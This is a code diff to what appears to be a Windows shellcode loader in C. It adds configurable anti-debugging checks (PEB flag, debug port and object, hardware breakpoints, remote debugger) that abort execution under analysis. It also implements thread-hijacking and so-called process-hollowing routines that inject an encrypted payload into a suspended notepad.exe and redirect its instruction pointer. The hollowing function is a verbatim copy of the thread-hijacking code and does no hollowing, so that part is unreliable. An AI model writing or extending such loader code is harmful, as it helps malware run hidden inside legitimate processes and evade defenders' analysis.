@@ -20,6 +20,11 @@ typedef struct {
 	unsigned char rc4_key[16];
 	unsigned char technique;
 	char target_process[MAX_PROCESS_NAME];
+	unsigned char check_peb_being_debugged;
+	unsigned char check_debug_port;
+	unsigned char check_debug_object;
+	unsigned char check_hardware_breakpoints;
+	unsigned char check_remote_debugger;
 } PatchData;
 #pragma pack(pop)
 
@@ -32,7 +37,12 @@ PatchData patch_data = {
 	{0},
 	{0},
 	0,
-	"notepad.exe"
+	"notepad.exe",
+	0,
+	0,
+	0,
+	0,
+	0
 };
 
 static unsigned char aes_sbox[256] = {
@@ -181,6 +191,81 @@ void decrypt_rc4(unsigned char* data, DWORD size, unsigned char* key, DWORD key_
 	}
 }
 
+BOOL check_peb_debugged() {
+	PPEB peb = (PPEB)__readgsqword(0x60);
+	return peb->BeingDebugged;
+}
+
+BOOL check_debug_port() {
+	HANDLE hProcess = GetCurrentProcess();
+	DWORD debugPort = 0;
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	if (!hNtdll) return FALSE;
+
+	typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+	if (!NtQueryInformationProcess) return FALSE;
+
+	if (NtQueryInformationProcess(hProcess, 7, &debugPort, sizeof(debugPort), NULL) == 0) {
+		return debugPort != 0;
+	}
+	return FALSE;
+}
+
+BOOL check_debug_object() {
+	HANDLE hProcess = GetCurrentProcess();
+	HANDLE debugObject = NULL;
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	if (!hNtdll) return FALSE;
+
+	typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+	if (!NtQueryInformationProcess) return FALSE;
+
+	if (NtQueryInformationProcess(hProcess, 30, &debugObject, sizeof(debugObject), NULL) == 0) {
+		return debugObject != NULL;
+	}
+	return FALSE;
+}
+
+BOOL check_hardware_breakpoints() {
+	CONTEXT ctx;
+	HANDLE hThread = GetCurrentThread();
+
+	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+	if (GetThreadContext(hThread, &ctx)) {
+		if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
+			return TRUE;
+		}
+	}
+	return FALSE;
+}
+
+BOOL check_remote_debugger_present() {
+	BOOL debuggerPresent = FALSE;
+	CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
+	return debuggerPresent;
+}
+
+BOOL perform_anti_debug_checks() {
+	if (patch_data.check_peb_being_debugged && check_peb_debugged()) {
+		return TRUE;
+	}
+	if (patch_data.check_debug_port && check_debug_port()) {
+		return TRUE;
+	}
+	if (patch_data.check_debug_object && check_debug_object()) {
+		return TRUE;
+	}
+	if (patch_data.check_hardware_breakpoints && check_hardware_breakpoints()) {
+		return TRUE;
+	}
+	if (patch_data.check_remote_debugger && check_remote_debugger_present()) {
+		return TRUE;
+	}
+	return FALSE;
+}
+
 void decrypt_payload() {
 	switch (patch_data.encryption_method) {
 	case ENC_XOR:
@@ -304,11 +389,125 @@ void inject_early_bird_apc() {
 }
 
 void inject_thread_hijacking() {
+	STARTUPINFOA si = {sizeof(si)};
+	PROCESS_INFORMATION pi;
+	LPVOID buf;
+	DWORD old;
+	CONTEXT ctx;
+	char cmd[MAX_PROCESS_NAME];
 
+	lstrcpyA(cmd, patch_data.target_process);
+
+	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+		return;
+	}
+
+	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!buf) {
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	ctx.ContextFlags = CONTEXT_ALL;
+	if (!GetThreadContext(pi.hThread, &ctx)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	ctx.Rip = (DWORD64)buf;
+	if (!SetThreadContext(pi.hThread, &ctx)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	ResumeThread(pi.hThread);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 }
 
 void inject_process_hollowing() {
+	STARTUPINFOA si = {sizeof(si)};
+	PROCESS_INFORMATION pi;
+	LPVOID buf;
+	DWORD old;
+	CONTEXT ctx;
+	char cmd[MAX_PROCESS_NAME];
 
+	lstrcpyA(cmd, patch_data.target_process);
+
+	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+		return;
+	}
+
+	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!buf) {
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	ctx.ContextFlags = CONTEXT_ALL;
+	if (!GetThreadContext(pi.hThread, &ctx)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	ctx.Rip = (DWORD64)buf;
+	if (!SetThreadContext(pi.hThread, &ctx)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	ResumeThread(pi.hThread);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 }
 
 void inject_remote_mapping() {
@@ -375,6 +574,10 @@ int main() {
 	}
 
 	if (patch_data.technique >= 5) {
+		return 1;
+	}
+
+	if (perform_anti_debug_checks()) {
 		return 1;
 	}
 
